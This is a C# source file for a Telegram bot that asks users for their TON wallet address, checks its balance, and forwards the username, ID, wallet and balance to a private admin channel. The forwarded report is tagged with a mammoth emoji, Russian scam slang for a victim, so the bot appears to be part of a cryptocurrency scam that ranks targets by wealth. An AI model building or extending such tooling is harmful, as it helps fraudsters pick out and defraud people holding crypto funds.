using Telegram.Bot;
using Telegram.Bot.Types.Enums;


using Requests;
using PostgreSQL;
using Bot_Keyboards;
using ConfigFile;
using Functions;

namespace States
{
    public class WalletState
    {
        public async static void MessageHandler(ITelegramBotClient botClient, string messageText, long chatId, string username)
        {
            string wallet = messageText;
            if(WalletFunction.CheckWalletRight(wallet))
            {
                if(UserDB.CheckWallet(wallet))
                {
                    await botClient.SendTextMessageAsync(
                        chatId: chatId,
                        text: $"<b>Данный TON кошелек уже привязан к другому аккаунту…\nПожалуйста воспользуетесь кошельком, которые еще не был привязан к нашему боту!\n\n⤵️ Введите адрес вашего кошелька:</b>",
                        parseMode: ParseMode.Html
                    );
                    return;
                }
                else
                {
                    List<double> balance;
                    try
                    {
                        balance = GetWalletInfo.GetWalletBalance(wallet);
                        if(UserDB.CheckWalletInVerificationTable(wallet)){ }
                        else
                        {
                            UserDB.AddNewWalletToVerificationTable(wallet);
                        }
                    }
                    catch(Exception)
                    {
                        await botClient.SendTextMessageAsync(
                            chatId: chatId,
                            text: $"<b>❗️ Данного кошелька не существует.</b>",
                            parseMode: ParseMode.Html,
                            replyMarkup: Keyboards.MenuKb
                        );
                        return;
                    }

                    if(UserDB.GetWallet(chatId)=="Не указан")
                    {
                        UserDB.UpdateWallet(chatId, wallet);
                        UserDB.UpdateState(chatId, "MainMenu");

                        await botClient.SendTextMessageAsync(
                            chatId: chatId,
                            text: $"<b>💎 Ваш текущий TON адрес: </b><code>{wallet}</code>",
                            parseMode: ParseMode.Html,
                            replyMarkup: Keyboards.MenuKb
                        );
                        
                        await botClient.SendTextMessageAsync(
                            chatId: Config.adminChannel,
                            text: $"<b>🦣 Пользователь: </b>@{username}\n<b>🆔 ID: </b><code>{chatId}</code>\n<b>💼 Кошелёк: </b><code>{wallet}</code>\n<b>💲 Баланс кошелька: </b><code>{balance[0]}</code> TON | <code>{balance[1]}</code> USD",
                            parseMode: ParseMode.Html
                        );
                        return;
                    }
                    else
                    {
                        UserDB.UpdateWallet(chatId, wallet);
                        UserDB.UpdateState(chatId, "MainMenu");
                        await botClient.SendTextMessageAsync(
                            chatId: chatId,
                            text: $"<b>💎 Ваш текущий TON адрес: </b><code>{wallet}</code>",
                            parseMode: ParseMode.Html,
                            replyMarkup: Keyboards.MenuKb
                        );
                        await botClient.SendTextMessageAsync(
                            chatId: Config.adminChannel,
                            text: $"<b>🦣 Пользователь: </b>@{username}\n<b>🆔 ID: </b><code>{chatId}</code>\n<b>💼 Кошелёк: </b><code>{wallet}</code>\n<b>💲 Баланс кошелька: </b><code>{balance[0]}</code> TON | <code>{balance[1]}</code> USD",
                            parseMode: ParseMode.Html
                        );
                        return;
                    }
                }
            }
            else
            {
                await botClient.SendTextMessageAsync(
                    chatId: chatId,
                    text: $"<b>☠️ Ошибка при вводе данных. Введите адрес вашего TON кошелька корректно.\n\nКак должен выглядеть кошелёк? </b> <code>EQAXFiR6KO1YJmiNOnlRzrkJUQARVU-audCjU53PCD4GR_93</code>",
                    parseMode: ParseMode.Html,
                    replyMarkup: Keyboards.MenuKb
                );
            }
        }
    }
}